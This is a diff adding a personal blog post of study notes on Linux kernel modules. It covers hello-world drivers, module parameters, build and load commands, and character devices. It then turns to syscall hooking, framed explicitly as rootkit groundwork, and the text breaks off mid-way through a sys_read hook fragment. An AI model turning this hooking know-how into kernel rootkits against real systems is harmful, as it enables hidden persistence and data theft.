@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Linux Drivers and How they work :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Introduction/ honorable mentions This document is solely for my own learning purposes, and is for my own personal use to reference back to when I am working with drivers. The content in the document has been taken from many different sources, and put mainly into my own words for my own understanding. This is not a document to teach people about Linux kernel drivers or rootkits and most of the written content is not my own." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/projects/linuxdrivers/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Linux Drivers and How they work :: Research blog">
+<meta property="og:description" content="Some of my notes I have accumplated and created on how the linux kernel works, how it interacts with drivers and how to write your own kernel mode drivers to do certain things with the OS." />
+<meta property="og:url" content="https://thomas-byrne.co.uk/projects/linuxdrivers/" />
+<meta property="og:site_name" content="Linux Drivers and How they work" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-12-14 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/projects/linuxdrivers/">Linux Drivers and How they work</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-12-14 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Linux Drivers and How they work" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="introduction-honorable-mentions">Introduction/ honorable mentions<a href="#introduction-honorable-mentions" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This document is solely for my own learning purposes, and is for my own personal use to reference back to when I am working with drivers. The content in the document has been taken from many different sources, and put mainly into my own words for my own understanding. This is not a document to teach people about Linux kernel drivers or rootkits and most of the written content is not my own. The documents used to piece together this work have been referenced at the end and I have tried to reference throughout when I have taken sections of text.</p>
+<h1 id="mechanism-vs-policy">Mechanism vs Policy<a href="#mechanism-vs-policy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>When writing drivers, a programmer should pay particular attention to this fundamental concept: write kernel code to access the hardware, but don’t force particular policies on the user, since different users have different needs.</p>
+<h1 id="role-of-the-kernel">Role of the Kernel<a href="#role-of-the-kernel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li>Process management</li>
+<li>Memory management</li>
+<li>Filesystems</li>
+<li>Device control</li>
+<li>Networking</li>
+</ul>
+<h1 id="loadable-modules">Loadable Modules<a href="#loadable-modules" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>One of the good features of Linux is the ability to extend at runtime the set of features offered by the kernel. This means that you can add functionality to the kernel (and remove functionality as well) while the system is up and running.</p>
+<p>Each piece of code that can be added to the kernel at runtime is called a module. The Linux kernel offers support for quite a few different types (or classes) of modules, including, but not limited to, device drivers. Each module is made up of object code (not linked into a complete executable) that can be dynamically linked to the running kernel by the insmod program and can be unlinked by the rmmod program.</p>
+<h1 id="classes-of-devices-and-modules">Classes of Devices and Modules<a href="#classes-of-devices-and-modules" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>char module, a block module, or a network module.</p>
+<h2 id="character-devices">Character devices<a href="#character-devices" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>A character (char) device is one that can be accessed as a stream of bytes (like a
+file); a char driver is in charge of implementing this behavior. Such a driver usually implements at least the open, close, read, and write system calls. The text
+console (/dev/console) and the serial ports (/dev/ttyS0 and friends) are examples
+of char devices</p>
+<h2 id="block-devices">Block devices<a href="#block-devices" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Like char devices, block devices are accessed by filesystem nodes in the /dev
+directory. A block device is a device (e.g., a disk) that can host a filesystem. I</p>
+<p>There are other ways of classifying driver modules that are orthogonal to the above
+device types. In general, some types of drivers work with additional layers of kernel
+support functions for a given type of device. For example, one can talk of universal
+serial bus (USB) modules, serial modules, SCSI modules, and so on. Every USB
+device is driven by a USB module that works with the USB subsystem, but the device
+itself shows up in the system as a char device (a USB serial port, say), a block device
+(a USB memory card reader), or a network device (a USB Ethernet interface).</p>
+<h1 id="compiling-a-driver">Compiling a driver<a href="#compiling-a-driver" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="write-your-source-code">Write your source code<a href="#write-your-source-code" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Write your driver in C, using kernel functions not c standard library functions</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+MODULE_LICENSE(<span style="color:#e6db74">&#34;Dual BSD/GPL&#34;</span>);
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hello_init</span>(<span style="color:#66d9ef">void</span>)
+{
+ printk(KERN_ALERT <span style="color:#e6db74">&#34;Hello, world</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+ <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hello_exit</span>(<span style="color:#66d9ef">void</span>)
+{
+ printk(KERN_ALERT <span style="color:#e6db74">&#34;Goodbye, cruel world</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+module_init(hello_init);
+module_exit(hello_exit);
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+MODULE_LICENSE(<span style="color:#e6db74">&#34;No Licence&#34;</span>);
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;user&#34;</span>;  					<span style="color:#75715e">//Defining pointer to variable name. Define as static as global variables are shared across the entire kernel space
+</span><span style="color:#75715e"></span>module_param(name, charp, S_IRUGO);             <span style="color:#75715e">//Allows variables to be passed to a module. + Definines permissions
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hello_init</span>(<span style="color:#66d9ef">void</span>)
+{
+ printk(KERN_INFO <span style="color:#e6db74">&#34;Hello %s, Welcome to the world</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+ <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hello_exit</span>(<span style="color:#66d9ef">void</span>)
+{
+ printk(KERN_INFO <span style="color:#e6db74">&#34;Goodbye, cruel world</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+module_init(hello_init);
+module_exit(hello_exit);
+</code></pre></div><h2 id="install-headers">Install headers<a href="#install-headers" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Headers and Linux source tree must be the same as the current kernel running on the device, otherwise you will need to recompile the kernel with the new source tree.</p>
+<p><strong>Generic headers</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>root💀kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/Documents/driver<span style="color:#f92672">]</span>
+└─# sudo apt-get install linux-headers-generic
+</code></pre></div><p><strong>Showing where source trees are stored</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>root💀kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/Documents/driver<span style="color:#f92672">]</span>
+└─# ls /lib/modules/5.14.0-kali4-amd64/build 
+arch  include  Makefile  Module.symvers  scripts  tools
+</code></pre></div><p><strong>Showing where headers are stored</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>root💀kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/Documents/driver<span style="color:#f92672">]</span>
+└─# ls /usr/src    
+linux-headers-5.14.0-kali4-amd64  linux-headers-5.14.0-kali4-common  linux-kbuild-5.14
+</code></pre></div><p><strong>Installing custom headers for your current kernel</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">molloyd@DebianJessieVM:~$ sudo apt-get update
+molloyd@DebianJessieVM:~$ apt-cache search linux-headers-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>
+linux-headers-3.16.0-4-amd64 - Header files <span style="color:#66d9ef">for</span> Linux 3.16.0-4-amd64  
+molloyd@DebianJessieVM:~$ sudo apt-get install linux-headers-3.16.0-4-amd64
+molloyd@DebianJessieVM:~$ cd /usr/src/linux-headers-3.16.0-4-amd64/
+</code></pre></div><h2 id="check-for-linux-kernel-image">Check for Linux kernel image<a href="#check-for-linux-kernel-image" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>root💀kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/kernel/linux-source-5.14<span style="color:#f92672">]</span>
+└─# dpkg -l | grep <span style="color:#e6db74">&#34;linux-image&#34;</span>                                                                                         <span style="color:#ae81ff">2</span> ⨯
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/driver<span style="color:#f92672">]</span>
+└─$ dpkg -l | grep <span style="color:#e6db74">&#34;linux-image&#34;</span>
+ii  linux-image-5.10.0-kali3-amd64         5.10.13-1kali1                     amd64        Linux 5.10 <span style="color:#66d9ef">for</span> 64-bit PCs
+ii  linux-image-5.10.0-kali9-amd64         5.10.46-4kali1                     amd64        Linux 5.10 <span style="color:#66d9ef">for</span> 64-bit PCs
+ii  linux-image-5.14.0-kali4-amd64         5.14.16-1kali1                     amd64        Linux 5.14 <span style="color:#66d9ef">for</span> 64-bit PCs
+ii  linux-image-amd64                      5.14.16-1kali1                     amd64        Linux <span style="color:#66d9ef">for</span> 64-bit PCs <span style="color:#f92672">(</span>meta-package<span style="color:#f92672">)</span>
+</code></pre></div><h2 id="makefile">Makefile<a href="#makefile" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>You can specify the kernel you want by hard-coding it or just use $(uname -r). To check which kernel you&rsquo;re running use uname -r, it all does the same thing.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/driver<span style="color:#f92672">]</span>
+└─$ uname -r
+5.14.0-kali4-amd64
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">obj-m <span style="color:#f92672">=</span> helloDriver.o
+
+KVERSION <span style="color:#f92672">=</span> 5.14.0-kali4-amd64
+
+all:
+        make -C /lib/modules/<span style="color:#66d9ef">$(</span>KVERSION<span style="color:#66d9ef">)</span>/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>PWD<span style="color:#66d9ef">)</span> modules
+
+clean:
+        make -C /lib/modules/<span style="color:#66d9ef">$(</span>KVERSION<span style="color:#66d9ef">)</span>/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>PWD<span style="color:#66d9ef">)</span> clean
+
+</code></pre></div><h2 id="loading-driver">loading driver<a href="#loading-driver" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/driver<span style="color:#f92672">]</span>                         
+└─$ ls                                                                                                                       
+helloDriver.c   helloDriver.mod    helloDriver.mod.o  linux-5.16-rc4  Makefile1  modules.order                               
+helloDriver.ko  helloDriver.mod.c  helloDriver.o      Makefile        Makefile2  Module.symvers
+
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/driver<span style="color:#f92672">]</span>                              
+└─$ sudo insmod helloDriver.ko         
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/driver<span style="color:#f92672">]</span>            
+└─$ lsmod
+Module                  Size  Used by
+helloDriver            <span style="color:#ae81ff">16384</span>  <span style="color:#ae81ff">0</span> 
+</code></pre></div><h2 id="seeing-driver-output">Seeing driver output<a href="#seeing-driver-output" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/driver<span style="color:#f92672">]</span>
+└─$ sudo tail /var/log/syslog                                                             
+Dec <span style="color:#ae81ff">13</span> 12:40:23 kali kernel: <span style="color:#f92672">[</span>  370.741637<span style="color:#f92672">]</span> helloDriver: loading out-of-tree module taints kernel.
+Dec <span style="color:#ae81ff">13</span> 12:40:23 kali kernel: <span style="color:#f92672">[</span>  370.742280<span style="color:#f92672">]</span> Hello, world
+
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/driver<span style="color:#f92672">]</span>
+└─$ sudo rmmod helloDriver.ko
+
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/driver<span style="color:#f92672">]</span>
+└─$ sudo tail /var/log/syslog
+Dec <span style="color:#ae81ff">13</span> 12:45:17 kali kernel: <span style="color:#f92672">[</span>  664.300931<span style="color:#f92672">]</span> Goodbye, cruel world
+</code></pre></div><h3 id="passing-arguments-from-command-line">Passing arguments from command line<a href="#passing-arguments-from-command-line" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The second piece of source code allows the user to pass arguments from the command line</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌─<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/driver<span style="color:#f92672">]</span>
+└─$ sudo insmod helloDriver.ko name<span style="color:#f92672">=</span>Tom
+
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/driver<span style="color:#f92672">]</span>
+└─$ sudo tail /var/log/syslog          
+Dec <span style="color:#ae81ff">13</span> 13:10:01 kali kernel: <span style="color:#f92672">[</span> 2148.998534<span style="color:#f92672">]</span> Hello Tom, Welcome to the world
+</code></pre></div><h2 id="module-info">Module info<a href="#module-info" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Rather than using the <strong>lsmod</strong> command, you can also find out information about the kernel module that is loaded, as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">molloyd@beaglebone:~/exploringBB/extras/kernel/hello$ **cd /proc**  
+molloyd@beaglebone:/proc$ **cat modules|grep hello**  
+hello <span style="color:#ae81ff">972</span> <span style="color:#ae81ff">0</span> - Live 0xbf903000 <span style="color:#f92672">(</span>O<span style="color:#f92672">)</span>
+</code></pre></div><p>This is the same information that is provided by the <strong>lsmod</strong> command but it also provides the current kernel memory offset for the loaded module, which is useful for debugging.</p>
+<p>You can control module parameters and information in the /sys/module directory.</p>
+<p><img src="/images/moduleParams.png" alt="moduleParameters"></p>
+<p>You can see that the state of the <code>name</code> variable is displayed, and that superuser permissions where not required to read the value. The latter is due to the <code>S_IRUGO</code> argument that was used in defining the module parameter.</p>
+<h1 id="character-device-drivers">Character device drivers<a href="#character-device-drivers" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="read-write-to-and-from-files">Read/ Write to and from files<a href="#read-write-to-and-from-files" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Need to define prototype functions and then you can generate a structure to create a short-hand reference to them basically.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// The prototype functions for the character driver -- must come before the struct definition
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">dev_open</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>);
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">dev_release</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>);
+<span style="color:#66d9ef">static</span> ssize_t <span style="color:#a6e22e">dev_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>, size_t, loff_t <span style="color:#f92672">*</span>);
+<span style="color:#66d9ef">static</span> ssize_t <span style="color:#a6e22e">dev_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>, size_t, loff_t <span style="color:#f92672">*</span>);
+
+<span style="color:#75715e">/** @brief Devices are represented as file structure in the kernel. The file_operations structure from
+</span><span style="color:#75715e">*  /linux/fs.h lists the callback functions that you wish to associated with your file operations
+</span><span style="color:#75715e">*  using a C99 syntax structure. char devices usually implement open, read, write and release calls
+</span><span style="color:#75715e">*/</span>
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> file_operations fops <span style="color:#f92672">=</span>
+{
+ .open <span style="color:#f92672">=</span> dev_open,
+ .read <span style="color:#f92672">=</span> dev_read,
+ .write <span style="color:#f92672">=</span> dev_write,
+ .release <span style="color:#f92672">=</span> dev_release,
+};
+</code></pre></div><h2 id="semaphores-and-mutexs">Semaphores and Mutex&rsquo;s<a href="#semaphores-and-mutexs" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>In the driver code, when taking in input from the user space, semaphores and mutex&rsquo;s must be defined to prevent the device from being accessing simultaneously. Once the device has been accessed the memory becomes locked by the Mutex, preventing it from being accesses by any other processes.</p>
+<h1 id="the-current-process">The current process<a href="#the-current-process" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>To access the current task/ the current tasks pid you need to access the global item &ldquo;current&rdquo;. Defined in <code>asm/current.h</code>.</p>
+<p>This yields a pointer to a struct called task_struct. Defined in <code>linux/sched.h</code>. The current pointer refers to the process that is currently executing.</p>
+<p>During the execution of a system call, such as open or read, the current process is the one that invoked the call.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printk(KERN_INFO <span style="color:#e6db74">&#34;The process is </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> (pid %i)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, current<span style="color:#f92672">-&gt;</span>comm, current<span style="color:#f92672">-&gt;</span>pid);
+</code></pre></div><p>Parent PID:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printk(KERN_INFO <span style="color:#e6db74">&#34;The parent process is </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> (pid %i)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, current<span style="color:#f92672">-&gt;</span>real_parent<span style="color:#f92672">-&gt;</span>comm, current<span style="color:#f92672">-&gt;</span>real_parent<span style="color:#f92672">-&gt;</span>pid);
+</code></pre></div><h1 id="function-hooking">Function hooking<a href="#function-hooking" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>To alter the behaviour of the running kernel we need to implement some function hooking. To do this we use <em>syscalls</em>. A few examples are: open, read, write, close, mkdir, kill fork, execve.</p>
+<p>So with a rootkit we can do a lot with these. We could exfiltrate data, execute malicious functions, dropping a RAT onto the system, or we could inspect system processes.</p>
+<p>&ldquo;If we want to to make a syscall, then we have to store the syscall number we want into the <code>rax</code> register and then call the kernel with the software interrupt <code>syscall</code>&rdquo; (TheXcellerator, 2021).</p>
+<h2 id="example-in-user-space">Example in user space<a href="#example-in-user-space" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>This example shows how syscalls happen in <strong>user</strong> space <em><strong>NOT</strong></em> kernel space.</p>
+<p>If we want to to make a syscall, then we have to store the syscall number we want into the <code>rax</code> register and then call the kernel with the software interrupt <code>syscall</code>. Any arguments that the syscall needs have to be loaded into certain registers before we use the interrupt and the return value is almost always placed into <code>rax</code>.</p>
+<p>This is best illustrated by an example - let’s take syscall 0, <code>sys_read</code> (all syscalls are prefaced by <code>sys_</code>). If we look up this syscall with <code>man 2 read</code>, we see that it is defined as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, size_t count);
+</code></pre></div><p><code>fd</code> is the file descriptor (returned from calling <code>open()</code>, <code>buf</code> is a buffer to store the read data into and <code>count</code> is the number of bytes to read. The return value is number of bytes successfully read, and is <code>-1</code> on error.</p>
+<p>So 3 arguments need to stored in some registers. To know which registers to store these arguments we can look at the Linux Syscall Reference (<a href="https://syscalls64.paolostivanin.com/">Linux Syscall Reference (paolostivanin.com)</a>)</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>rax</th>
+<th>rdi</th>
+<th>rsi</th>
+<th>rdx</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sys_read</td>
+<td>0x00</td>
+<td>unsigned int fd</td>
+<td>char __user *buf</td>
+<td>size_t count</td>
+</tr>
+</tbody>
+</table>
+<p>Our NASM might look like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-NASM" data-lang="NASM"><span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x0</span>
+<span style="color:#a6e22e">mov</span> rdi, <span style="color:#ae81ff">5</span>
+<span style="color:#a6e22e">mov</span> rsi, buf
+<span style="color:#a6e22e">mov</span> rdx, <span style="color:#ae81ff">10</span>
+<span style="color:#a6e22e">syscall</span>
+</code></pre></div><h2 id="example-in-kernel-space---32-bit">Example in Kernel space - 32 bit<a href="#example-in-kernel-space---32-bit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Syscalls worked like this in old kernel architectures</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">asmlinkage <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">sys_read</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t count);
+</code></pre></div><p>All arguments were passed to the syscall exactly like this. So if we were writing a hook for sys_read, we&rsquo;d just have to imitate this function and we could play with these arguments however we liked.</p>
+<h2 id="example-in-kernel-space---64-bit-4170">Example in Kernel space - 64 bit (&gt;4.17.0)<a href="#example-in-kernel-space---64-bit-4170" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Syscalls changed in 64 bit kernel architectures, arguments are now copied into a struct called pt_regs, which is then passed to the syscall, which is then responsible for pulling out the information it wants.</p>
+<p>Looking at the ptrace.h header file the struct looks like this. What we see here are references to registers on the cpu (r)bx (r)si (r)cx etc.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> pt_regs {
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> bx;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> cx;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> dx;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> si;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> di;
+    [...SNIP...]
+};
+</code></pre></div><p>So with a sys_read syscall we would have to do something like this. We know we neeed to reference the rdi register from the syscall reference table seen earlier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">asmlinkage <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">sys_read</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
+{
+    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>di;
+    <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>si;
